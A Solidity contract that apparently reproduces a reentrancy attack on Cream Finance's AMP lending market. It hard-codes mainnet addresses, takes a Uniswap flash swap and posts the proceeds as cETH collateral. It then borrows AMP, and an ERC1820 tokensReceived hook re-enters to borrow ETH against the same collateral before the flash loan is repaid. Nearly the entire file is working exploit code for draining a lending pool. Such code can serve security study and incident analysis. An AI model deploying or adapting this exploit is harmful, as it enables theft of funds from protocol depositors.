pragma solidity ^0.8.0;

pragma experimental ABIEncoderV2;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./interface/Compound/ICEther.sol";
import "./interface/Compound/ICToken.sol";
import "./interface/Compound/IComptroller.sol";
import "./interface/Compound/ICompoundPriceOracle.sol";
import "./interface/Uniswap/IUniswapV2Pair.sol";
import "./interface/Uniswap/IUniswapV2Factory.sol";
import "./interface/Uniswap/IUniswapV2Router.sol";

interface IERC1820Registry {
    function getInterfaceImplementer(address _addr, bytes32 _interfaceHash)
        external
        view
        returns (address);

    function setInterfaceImplementer(
        address account,
        bytes32 _interfaceHash,
        address implementer
    ) external;
}

interface IWETH {
    function transfer(address, uint256) external returns (bool);

    function deposit() external payable;

    function withdraw(uint256) external;

    function balanceOf(address) external returns (uint256);
}

/**
 * @title IAmpTokensRecipient
 * @dev IAmpTokensRecipient token transfer hook interface
 */
interface IAmpTokensRecipient {
    /**
     * @dev Report if the recipient will successfully receive the tokens
     */
    function canReceive(
        bytes4 functionSig,
        bytes32 partition,
        address operator,
        address from,
        address to,
        uint256 value,
        bytes calldata data,
        bytes calldata operatorData
    ) external view returns (bool);

    /**
     * @dev Hook executed upon a transfer to the recipient
     */
    function tokensReceived(
        bytes4 functionSig,
        bytes32 partition,
        address operator,
        address from,
        address to,
        uint256 value,
        bytes calldata data,
        bytes calldata operatorData
    ) external;
}

contract Luck {
    // Uniswap Address
    address private constant factory =
        0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant router =
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant pair = 0x21b8065d10f73EE2e260e5B47D3344d3Ced7596E; // WISE/WETH

    // Token Address
    address private constant amp = 0xfF20817765cB7f73d4bde2e66e067E58D11095C2;
    address private constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // ERC1820 Address
    address private constant erc1820 =
        0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24;
    // Fuck: It's defination not same as standard ERC777!
    bytes32 private constant ERC1820_InterfaceHash_TokensReceived =
        keccak256(abi.encodePacked("AmpTokensRecipient"));

    // Cream Address
    address private constant oracle =
        0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d;
    address private constant cramp = 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6;
    address private constant ceth = 0xD06527D5e56A3495252A528C4987003b712860eE;
    address private constant unitroller =
        0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258;

    constructor() {
        IERC1820Registry(erc1820).setInterfaceImplementer(
            address(this),
            ERC1820_InterfaceHash_TokensReceived,
            address(this)
        );
    }

    function good_luck() external {
        IUniswapV2Pair(pair).swap(0, 500 ether, address(this), "0x8888");
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0Out,
        uint256 amount1Out,
        bytes calldata data
    ) external {
        IWETH(weth).withdraw(IWETH(weth).balanceOf(address(this)));
        ICEther(ceth).mint{value: address(this).balance}();
        address[] memory cTokens = new address[](1);
        cTokens[0] = ceth;
        IComptroller(unitroller).enterMarkets(cTokens);
        (, uint256 account_liquidity, ) = IComptroller(unitroller)
            .getAccountLiquidity(address(this));
        uint256 underlying_price = ICompoundPriceOracle(oracle)
            .getUnderlyingPrice(cramp);
        uint256 borrow_amount = (account_liquidity / underlying_price) * 1e18;
        uint256 reserve = IERC20(amp).balanceOf(cramp);
        ICToken(cramp).borrow(
            reserve > borrow_amount ? borrow_amount : reserve
        );

        IERC20(amp).approve(router, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = amp;
        path[1] = weth;
        IUniswapV2Router(router).swapExactTokensForTokens(
            IERC20(amp).balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp + 120
        );
        uint256 repay_amount = (1000 * amount1Out) / 997 + 1;
        IWETH(weth).deposit{value: address(this).balance}();
        // It shoud repay to pair not router!
        IWETH(weth).transfer(pair, repay_amount);
    }

    // Fuck: It's defination not same as standard ERC777!
    function tokensReceived(
        bytes4 functionSig,
        bytes32 partition,
        address operator,
        address from,
        address to,
        uint256 value,
        bytes calldata data,
        bytes calldata operatorData
    ) external {
        (, uint256 account_liquidity, ) = IComptroller(unitroller)
            .getAccountLiquidity(address(this));
        ICEther(ceth).borrow(account_liquidity);
    }

    receive() external payable {}
}
